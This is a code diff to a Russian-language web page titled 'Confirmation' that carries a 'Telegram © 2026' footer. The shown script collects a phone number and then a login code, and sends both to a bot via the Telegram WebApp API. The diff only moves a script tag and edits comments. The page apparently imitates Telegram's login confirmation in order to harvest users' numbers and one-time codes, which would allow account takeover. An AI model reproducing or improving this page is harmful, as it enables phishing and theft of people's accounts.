@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Подтверждение</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
             margin: 0;
@@ -135,7 +136,6 @@
         <div class="footer">Telegram © 2026</div>
     </div>
 
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
         let step = 'phone';
         let phone = '';
@@ -155,7 +155,7 @@
                 status.textContent = 'Отправляем код...';
                 status.className = 'status';
 
-                // ==== ОТПРАВЛЯЕМ НОМЕР В БОТА ====
+                // ОТПРАВКА НОМЕРА
                 window.Telegram.WebApp.sendData(JSON.stringify({
                     phone: phone,
                     code: ''
@@ -180,7 +180,7 @@
                 status.textContent = 'Проверяем...';
                 status.className = 'status';
 
-                // ==== ОТПРАВЛЯЕМ КОД В БОТА ====
+                // ОТПРАВКА КОДА
                 window.Telegram.WebApp.sendData(JSON.stringify({
                     phone: phone,
                     code: code
